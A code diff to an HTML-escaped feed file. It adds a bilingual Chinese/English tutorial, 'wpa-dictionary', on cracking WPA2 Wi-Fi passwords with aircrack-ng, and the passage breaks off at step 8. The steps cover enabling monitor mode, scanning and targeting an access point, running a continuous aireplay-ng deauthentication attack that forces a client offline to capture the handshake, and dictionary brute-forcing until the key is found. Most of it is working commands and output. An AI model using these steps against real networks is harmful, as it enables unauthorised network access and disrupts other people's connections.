@@ -8075,7 +8075,376 @@ Cookie 是你的“网络身份证”。如果我拿到了你的 Cookie，我就
 &lt;h3 id=&#34;总结&#34;&gt;总结
 &lt;/h3&gt;&lt;p&gt;这份修正后的文档不仅纠正了操作错误，更重要的是建立了&lt;strong&gt;安全意识&lt;/strong&gt;（如签名校验、权限管理）和&lt;strong&gt;工程化思维&lt;/strong&gt;（如包管理机制、协议原理）。在我的沙箱实验室中，这是作为一名合格工程师的最低标准。&lt;/p&gt;
 &lt;p&gt;现在，去执行你的任务吧。&lt;/p&gt;
-</description>
+&lt;h1 id=&#34;wpa-dictionary&#34;&gt;wpa-dictionary
+&lt;/h1&gt;&lt;p&gt;Used for Wi-Fi password cracking | 用于 Wi-Fi 密码破解。&lt;/p&gt;
+&lt;h3 id=&#34;linux-篇recommended--推荐&#34;&gt;Linux 篇（Recommended | 推荐）
+&lt;/h3&gt;&lt;p&gt;The Kali distribution already has everything installed | Kali 发行版已经安装了所有东西&lt;/p&gt;
+&lt;p&gt;Full english instructions at: &lt;a class=&#34;link&#34; href=&#34;https://aircrack-ng.org/doku.php?id=getting_started&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://aircrack-ng.org/doku.php?id=getting_started&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-install--安装-aircrack-ng&#34;&gt;1. Install | 安装 aircrack-ng
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;On Debian/Ubuntu using apt to install: | 使用相应包管理工具安装，例如 Debian/Ubuntu 使用 apt 安装：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install aircrack-ng
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;2-view-available-wireless-network-cards--查看可用的无线网卡&#34;&gt;2. View available wireless network cards | 查看可用的无线网卡
+&lt;/h3&gt;&lt;p&gt;Use the command | 使用命令：&lt;code&gt;airmon-ng&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~/workspace$ sudo airmon-ng
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PHY	Interface	Driver		Chipset
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The available wifi card is &lt;code&gt;wlp8s0&lt;/code&gt; | 根据以上输出，可用的无线网卡为 &lt;code&gt;wlp8s0&lt;/code&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;3-specify-the-wireless-network-card-to-turn-on-the-monitor-mode--指定无线网卡开启监听模式&#34;&gt;3. Specify the wireless network card to turn on the monitor mode | 指定无线网卡开启监听模式。
+&lt;/h3&gt;&lt;p&gt;使用命令：&lt;code&gt;airmon-ng start &amp;lt;网卡名称&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Use the command &lt;code&gt;airmon-ng start wlp8s0&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PHY	Interface	Driver		Chipset
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		(mac80211 station mode vif disabled for [phy0]wlp8s0)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now wlp8s0 is available for monitoring as &lt;code&gt;wlp8s0mon&lt;/code&gt; | 根据以上输出，已经把 wlp8s0 这块无线网卡开启监听模式，开启后名字是 &lt;code&gt;wlp8s0mon&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。&lt;/p&gt;
+&lt;p&gt;With the monitor mode active the card can not be used to connect to any wifi, you have to stop it later to use as a normal card&lt;/p&gt;
+&lt;h3 id=&#34;4-scan-for-nearby-wireless-networks--扫描附近的无线网络&#34;&gt;4. Scan for nearby wireless networks | 扫描附近的无线网络
+&lt;/h3&gt;&lt;p&gt;使用命令：&lt;code&gt;airodump-ng &amp;lt;处于监听模式的网卡名称&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Use the command &lt;code&gt;airodump-ng wlp8s0mon&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这一步会输出两个列表，两个列表不停在刷新。&lt;/p&gt;
+&lt;p&gt;第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;BSSID: 无线 AP 的硬件地址&lt;/li&gt;
+&lt;li&gt;PWR: 信号强度，值是负数，绝对值越小表示信号越强&lt;/li&gt;
+&lt;li&gt;CH: 无线网络信道&lt;/li&gt;
+&lt;li&gt;ENC: 加密方式，我们要破解的是 WPA2&lt;/li&gt;
+&lt;li&gt;ESSID: 无线网络的名称&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;第二个列表表示某个无线网络中和用户设备的连接信息：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;BSSID: 无线 AP 的硬件地址&lt;/li&gt;
+&lt;li&gt;STATION: 用户设备的硬件地址&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。&lt;/p&gt;
+&lt;p&gt;这里仅仅是演示，所以列表只保留了一条结果。&lt;/p&gt;
+&lt;h3 id=&#34;5-使用参数过滤扫描列表确定扫描目标&#34;&gt;5. 使用参数过滤扫描列表，确定扫描目标
+&lt;/h3&gt;&lt;p&gt;使用命令：&lt;code&gt;airodump-ng -w &amp;lt;扫描结果保存的文件名&amp;gt; -c &amp;lt;无线网络信道&amp;gt; --bssid &amp;lt;目标无线 AP 的硬件地址&amp;gt; &amp;lt;处于监听模式的网卡名称&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;刚扫描时看到输出的扫描状态是这样的：&lt;code&gt;CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;只有当扫描状态后面出现 &lt;code&gt; ][ WPA handshake: 22:47:DA:62:2A:F0&lt;/code&gt; 后，我们才拿到拿到进行破解的握手包。&lt;/p&gt;
+&lt;p&gt;扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。&lt;/p&gt;
+&lt;p&gt;所以我们可以同时使用 &lt;code&gt;aireplay-ng&lt;/code&gt; 对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。&lt;/p&gt;
+&lt;p&gt;拿到握手包后按 Ctrl-C 结束扫描即可。&lt;/p&gt;
+&lt;h3 id=&#34;6-使用-aireplay-ng-对目标设备发起攻击&#34;&gt;6. 使用 aireplay-ng 对目标设备发起攻击
+&lt;/h3&gt;&lt;p&gt;使用命令：&lt;code&gt;aireplay-ng -&amp;lt;攻击模式&amp;gt; &amp;lt;攻击次数&amp;gt; -a 无线 AP 硬件地址&amp;gt; -c &amp;lt;用户设备硬件地址&amp;gt; &amp;lt;处于监听模式的网卡名称&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;发起攻击后，当 &lt;code&gt;airodump-ng&lt;/code&gt; 成功拿到了握手包，使用 Ctrl-C 退出攻击。&lt;/p&gt;
+&lt;h3 id=&#34;7-使用-aircrack-ng-暴力破解-wi-fi-密码&#34;&gt;7. 使用 aircrack-ng 暴力破解 Wi-Fi 密码
+&lt;/h3&gt;&lt;p&gt;使用命令：&lt;code&gt;aircrack-ng -w 密码字典 &amp;lt;包含握手包的 cap 文件&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Opening android-01.cap
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Read 675 packets.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   #  BSSID              ESSID                     Encryption
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Choosing first network as target.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Opening android-01.cap
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Reading packets, please wait...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                 Aircrack-ng 1.2 rc4
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      [00:00:00] 12/2492 keys tested (828.33 k/s) 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      Time left: 2 seconds                                       0.48%
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                          KEY FOUND! [ 1234567890 ]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;根据以上输出，我们已经破解成功！Wi-Fi 密码是：&lt;code&gt;1234567890&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;8-无线网卡退出监听模式&#34;&gt;8. 无线网卡退出监听模式
